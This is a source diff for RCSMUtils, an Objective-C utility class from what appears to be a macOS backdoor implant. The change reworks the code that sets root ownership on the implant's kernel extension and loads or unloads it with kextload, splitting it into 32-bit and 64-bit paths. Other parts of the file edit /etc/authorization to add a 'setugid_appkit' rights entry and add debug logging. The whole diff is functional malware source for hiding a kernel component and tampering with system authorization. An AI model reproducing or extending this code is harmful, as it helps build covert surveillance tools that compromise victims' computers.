@@ -20,7 +20,8 @@ static RCSMUtils *sharedUtils = nil;
 @implementation RCSMUtils
 
 @synthesize mBackdoorPath;
-@synthesize mKextPath;
+@synthesize mKext32Path;
+@synthesize mKext64Path;
 @synthesize mSLIPlistPath;
 @synthesize mServiceLoaderPath;
 @synthesize mExecFlag;
@@ -118,10 +119,6 @@ static RCSMUtils *sharedUtils = nil;
       withArguments: (NSArray *)arguments
        waitUntilEnd: (BOOL)waitForExecution
 {
-#ifdef DEBUG_UTILS
-  NSLog(@"%s - Executing %@", __FUNCTION__, anAppPath);
-#endif
-  
   NSTask *task = [[NSTask alloc] init];
   [task setLaunchPath: anAppPath];
   
@@ -132,10 +129,27 @@ static RCSMUtils *sharedUtils = nil;
   [task setStandardOutput: _pipe];
   [task setStandardError:  _pipe];
   
+#ifdef DEBUG_UTILS
+  infoLog(@"Executing %@", anAppPath);
+#endif
+  
   [task launch];
   
+#ifdef DEBUG_UTILS
+  infoLog(@"Executed %@", anAppPath);
+#endif
+  
   if (waitForExecution == YES)
-    [task waitUntilExit];
+    {
+#ifdef DEBUG_UTILS
+      infoLog(@"Waiting until task exit");
+#endif
+      [task waitUntilExit];
+    }
+  
+#ifdef DEBUG_UTILS
+  infoLog(@"Task exited");
+#endif
   
   [task release];
 }
@@ -506,49 +520,95 @@ static RCSMUtils *sharedUtils = nil;
     }
 }
 
-- (BOOL)loadKext
+- (BOOL)loadKextFor64bit: (BOOL)is64bit
 {
-#ifdef DEBUG_UTILS
-  NSLog(@"Loading our KEXT @ %@", mKextPath);
-#endif
-  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: mKextPath])
+  if (is64bitKernel())
     {
 #ifdef DEBUG_UTILS
-      NSLog(@"KEXT found");
+      NSLog(@"Loading KEXT64 @ %@", mKext64Path);
 #endif
-      NSArray *arguments = [NSArray arrayWithObjects: @"-R",
-                            @"744",
-                            mKextPath,
-                            nil];
-      [self executeTask: @"/bin/chmod"
-          withArguments: arguments
-           waitUntilEnd: YES];
-      
-      if (getuid() == 0 || geteuid() == 0)
+      if ([[NSFileManager defaultManager] fileExistsAtPath: mKext64Path])
         {
-          arguments = [NSArray arrayWithObjects: @"-R",
-                       @"root:wheel",
-                       mKextPath,
-                       nil];
-          [self executeTask: @"/usr/sbin/chown"
+#ifdef DEBUG_UTILS
+          NSLog(@"KEXT64 found");
+#endif
+          NSArray *arguments = [NSArray arrayWithObjects: @"-R",
+                                                          @"744",
+                                                          mKext64Path,
+                                                          nil];
+          [self executeTask: @"/bin/chmod"
               withArguments: arguments
                waitUntilEnd: YES];
-          
-          arguments = [NSArray arrayWithObjects: mKextPath, nil];
-          
-          [self executeTask: @"/sbin/kextload"
-              withArguments: arguments
-               waitUntilEnd: YES];
+
+          if (getuid() == 0 || geteuid() == 0)
+            {
+              arguments = [NSArray arrayWithObjects: @"-R",
+                                                     @"root:wheel",
+                                                     mKext64Path,
+                                                     nil];
+              [self executeTask: @"/usr/sbin/chown"
+                  withArguments: arguments
+                   waitUntilEnd: YES];
+
+              arguments = [NSArray arrayWithObjects: mKext64Path, nil];
+
+              [self executeTask: @"/sbin/kextload"
+                  withArguments: arguments
+                   waitUntilEnd: YES];
+            }
+        }
+      else
+        {
+#ifdef DEBUG_UTILS
+          NSLog(@"KEXT64 not found");
+#endif
+
+          return NO;
         }
     }
   else
     {
 #ifdef DEBUG_UTILS
-      NSLog(@"KEXT not found");
+      //NSLog(@"Loading KEXT32 @ %@", mKextPath);
 #endif
-      
-      return NO;
+      if ([[NSFileManager defaultManager] fileExistsAtPath: mKext32Path])
+        {
+#ifdef DEBUG_UTILS
+          NSLog(@"KEXT32 found");
+#endif
+          NSArray *arguments = [NSArray arrayWithObjects: @"-R",
+                                                          @"744",
+                                                          mKext32Path,
+                                                          nil];
+          [self executeTask: @"/bin/chmod"
+              withArguments: arguments
+               waitUntilEnd: YES];
+
+          if (getuid() == 0 || geteuid() == 0)
+            {
+              arguments = [NSArray arrayWithObjects: @"-R",
+                                                     @"root:wheel",
+                                                     mKext32Path,
+                                                     nil];
+              [self executeTask: @"/usr/sbin/chown"
+                  withArguments: arguments
+                   waitUntilEnd: YES];
+
+              arguments = [NSArray arrayWithObjects: mKext32Path, nil];
+
+              [self executeTask: @"/sbin/kextload"
+                  withArguments: arguments
+                   waitUntilEnd: YES];
+            }
+        }
+      else
+        {
+#ifdef DEBUG_UTILS
+          NSLog(@"KEXT32 not found");
+#endif
+
+          return NO;
+        }
     }
   
   return YES;
@@ -556,34 +616,65 @@ static RCSMUtils *sharedUtils = nil;
 
 - (BOOL)unloadKext
 {
-#ifdef DEBUG_UTILS
-  NSLog(@"Unloading our KEXT @ %@", mKextPath);
-#endif
-  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: mKextPath])
+  if (is64bitKernel())
     {
 #ifdef DEBUG_UTILS
-      NSLog(@"KEXT found");
+      NSLog(@"Unloading our KEXT64 @ %@", mKext64Path);
 #endif
-      
-      if (getuid() == 0 || geteuid() == 0)
+
+      if ([[NSFileManager defaultManager] fileExistsAtPath: mKext64Path])
         {
-          NSArray *arguments = [NSArray arrayWithObjects: mKextPath, nil];
-          
-          [self executeTask: @"/sbin/kextunload"
-              withArguments: arguments
-               waitUntilEnd: YES];
+#ifdef DEBUG_UTILS
+          NSLog(@"KEXT64 found");
+#endif
+
+          if (getuid() == 0 || geteuid() == 0)
+            {
+              NSArray *arguments = [NSArray arrayWithObjects: mKext64Path, nil];
+
+              [self executeTask: @"/sbin/kextunload"
+                  withArguments: arguments
+                   waitUntilEnd: YES];
+            }
+        }
+      else
+        {
+#ifdef DEBUG_UTILS
+          NSLog(@"KEXT64 not found");
+#endif
+          return NO;
         }
     }
   else
     {
 #ifdef DEBUG_UTILS
-      NSLog(@"KEXT not found");
+      NSLog(@"Unloading our KEXT32 @ %@", mKext32Path);
 #endif
-      
-      return NO;
+
+      if ([[NSFileManager defaultManager] fileExistsAtPath: mKext32Path])
+        {
+#ifdef DEBUG_UTILS
+          NSLog(@"KEXT32 found");
+#endif
+
+          if (getuid() == 0 || geteuid() == 0)
+            {
+              NSArray *arguments = [NSArray arrayWithObjects: mKext32Path, nil];
+
+              [self executeTask: @"/sbin/kextunload"
+                  withArguments: arguments
+                   waitUntilEnd: YES];
+            }
+        }
+      else
+        {
+#ifdef DEBUG_UTILS
+          NSLog(@"KEXT not found");
+#endif
+          return NO;
+        }
     }
-  
+
   return YES;
 }
 
@@ -603,21 +694,12 @@ static RCSMUtils *sharedUtils = nil;
   NSPropertyListFormat format;
   NSMutableDictionary *rootObject = nil;
   
-#ifdef MAC_OS_X_VERSION_10_6
   NSError *error;
   rootObject = (NSMutableDictionary *)
     [NSPropertyListSerialization propertyListWithData: binData
                                               options: NSPropertyListMutableContainersAndLeaves
                                                format: &format
                                                 error: &error];
-#else
-  NSString *error;
-  rootObject = (NSMutableDictionary *)
-    [NSPropertyListSerialization propertyListFromData: binData
-                                     mutabilityOption: NSPropertyListMutableContainersAndLeaves
-                                               format: &format
-                                     errorDescription: &error];
-#endif
   
   NSArray *rootKeys = [rootObject allKeys];
   
@@ -646,6 +728,9 @@ static RCSMUtils *sharedUtils = nil;
                   
                   if (object == nil)
                     {
+#ifdef DEBUG_UTILS
+                      warnLog(@"setugid_appkit capability not found");
+#endif
                       NSArray *keys = [NSArray arrayWithObjects: @"class",
                                                                  @"comment",
                                                                  nil];
@@ -660,9 +745,21 @@ static RCSMUtils *sharedUtils = nil;
                                                                             forKey: entryKey];
                       [dictsArray addEntriesFromDictionary: outerDict];
                     }
+                  else
+                    {
+#ifdef DEBUG_UTILS
+                      warnLog(@"setugid_appkit capability already found");
+#endif
+                    }
                 }
             }
         }
+    }
+  else
+    {
+#ifdef DEBUG_UTILS
+      errorLog(@"rootObject not found");
+#endif
     }
   
   return [self saveSLIPlist: rootObject
@@ -722,6 +819,22 @@ static RCSMUtils *sharedUtils = nil;
   
   return [self saveSLIPlist: rootObject
                      atPath: @"/etc/authorization"];  
+}
+
+- (BOOL)isLeopard
+{
+  if (gOSMajor == 10 && gOSMinor == 5)
+    return YES;
+  
+  return NO;
+}
+
+- (BOOL)isLion
+{
+  if (gOSMajor == 10 && gOSMinor == 7)
+    return YES;
+  
+  return NO;
 }
 
 @end
